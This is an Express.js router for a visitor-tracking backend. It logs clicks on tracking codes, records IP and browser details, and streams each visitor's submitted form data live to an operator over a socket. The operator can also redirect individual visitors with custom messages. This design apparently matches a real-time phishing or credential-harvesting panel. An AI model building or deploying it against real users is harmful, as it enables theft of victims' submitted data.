const express = require('express');
const router = express.Router();
const { Session, Link } = require('../models');
const { v4: uuidv4 } = require('uuid');
const db = require('../db');

router.get('/click/:code', (req, res) => {
  try {
    const visitorId = uuidv4();
    const ua = req.headers['user-agent'] || '';
    const s = Session.create({ trackingCode: req.params.code, visitorId, ip: req.ip, browser: ua.substring(0, 50), deviceType: /mobile/i.test(ua) ? 'Mobile' : 'Desktop', status: 'Active', isLive: true, entryUrl: req.params.code, currentUrl: req.params.code, lastActivity: new Date().toISOString(), clicks: 0 });
    const link = Link.findOne({ trackingCode: req.params.code });
    if (link) Link.findByIdAndUpdate(link._id, { total_clicks: (link.total_clicks||0)+1 });
    const io = req.app.get('io'); if (io) io.emit('newSession', s);
    res.json(s);
  } catch (err) { res.status(500).json({ message: 'Server error' }); }
});

router.get('/check-redirect/:code', (req, res) => {
  try {
    const all = db.sessions.read();
    const s = all.filter(x => x.trackingCode === req.params.code && x.status === 'Redirected').sort((a,b) => new Date(b.lastActivity) - new Date(a.lastActivity))[0];
    if (s) res.json({ redirectUrl: s.currentUrl, message: s.lastMessage || '' });
    else res.json({ redirectUrl: null, message: null });
  } catch (err) { res.status(500).json({ message: 'Server error' }); }
});

router.post('/visit', (req, res) => {
  try {
    const s = Session.create({ trackingCode: req.body.trackingCode||'unknown', visitorId: req.body.visitorId||uuidv4(), ip: req.ip, browser: req.body.browser||'', deviceType: req.body.device||'Desktop', status: 'Active', isLive: true, entryUrl: req.body.trackingCode||'', currentUrl: req.body.trackingCode||'', lastActivity: new Date().toISOString(), clicks: 0 });
    const io = req.app.get('io'); if (io) io.emit('newSession', s);
    res.json(s);
  } catch(err) { res.status(500).json({ message: 'Server error' }); }
});

router.post('/submit', (req, res) => {
  try {
    const { visitorId, formData } = req.body;
    if (!visitorId) return res.status(400).json({ message: 'No visitorId' });
    let all = db.sessions.read(); let idx = all.findIndex(x => x.visitorId === visitorId);
    if (idx === -1) { const s = Session.create({ trackingCode: 'direct', visitorId, ip: req.ip, browser: 'Unknown', deviceType: 'Desktop', status: 'Active', isLive: true, formData: formData, entryUrl: '', currentUrl: '', lastActivity: new Date().toISOString(), clicks: 0 }); const io = req.app.get('io'); if (io) { io.emit('newSession', s); io.emit('formSubmitted', { visitorId, formData }); } return res.json({ message: 'Submitted' }); }
    all[idx].formData = { ...(all[idx].formData || {}), ...formData }; all[idx].lastActivity = new Date().toISOString(); db.sessions.write(all);
    const io = req.app.get('io'); if (io) io.emit('formSubmitted', { visitorId, formData });
    res.json({ message: 'Submitted' });
  } catch(err) { res.status(500).json({ message: 'Server error' }); }
});

router.post('/heartbeat', (req, res) => {
  try {
    const { visitorId, status } = req.body;
    if(!visitorId) return res.json({ ok: false });
    const all = db.sessions.read(); const i = all.findIndex(s => s.visitorId === visitorId);
    if(i !== -1) { all[i].isLive = status !== 'Offline'; all[i].status = status === 'Offline' ? 'Offline' : 'Active'; all[i].lastActivity = new Date().toISOString(); db.sessions.write(all); if(status === 'Offline') { const io = req.app.get('io'); if(io) io.emit('visitorOffline', { visitorId }); } }
    res.json({ ok: true });
  } catch(err) { res.status(500).json({ message: 'Server error' }); }
});

module.exports = router;